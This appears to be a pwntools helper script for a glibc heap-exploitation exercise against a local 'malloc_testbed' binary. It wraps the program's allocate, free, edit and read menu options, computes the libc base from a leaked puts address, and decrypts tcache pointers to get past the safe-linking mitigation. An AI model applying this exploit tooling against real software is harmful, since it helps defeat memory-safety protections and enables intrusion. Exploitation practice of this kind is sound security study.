from pwn import *

def get_libc_addr(p):
    libc = ELF('../.glibc/malloc_testbed_glibc/libc.so.6')
    puts_offset = libc.symbols['puts']
    p.recvuntil('@ ')
    puts = int(p.recvline().strip(), 16)
    libc.address = puts - puts_offset

    return libc

def malloc(p, size):
    p.sendafter('>', b'1')
    p.sendafter('size:', size)

def free(p, index):
    p.sendafter('>', b'3')
    p.sendafter('index:', index)

def edit(p, index, data):
    p.sendafter('>', b'5')
    p.sendafter('index:', index)
    p.sendafter('data:', data)

def read_chunk(p, index):
    p.sendafter('>', b'6')
    p.sendafter('index:', index)

def get_addr_len(address):
    '''Get address length in bits'''
    len = 0
    while address & 0xffffffffffffffff:  # assume 64 bit addressing
        len += 4
        address = address >> 4
    return len

def decrypt_tcache(encrypted_address):
    '''
    https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation

    Shifting and masking to slowly build our decrypted address.
    '''
    addr_len = get_addr_len(encrypted_address) 

    #Fencepost to get initial decrypted value.
    #The first 12 bits of the addr are already good to go due to how the encryption works.
    offset = 12
    mask = 0xfff << addr_len - offset
    decrypted = encrypted_address & mask

    #Each time we iterate, another 12 bits is decrypted. Add that to our decrypted value.
    #We control which bits we retrieve via a moving mask.
    offset += 12
    while offset < addr_len: 
        mask = 0xfff << addr_len - offset
        result = (decrypted >> 12) ^ encrypted_address
        decrypted += result & mask
        offset += 12
    
    return decrypted
    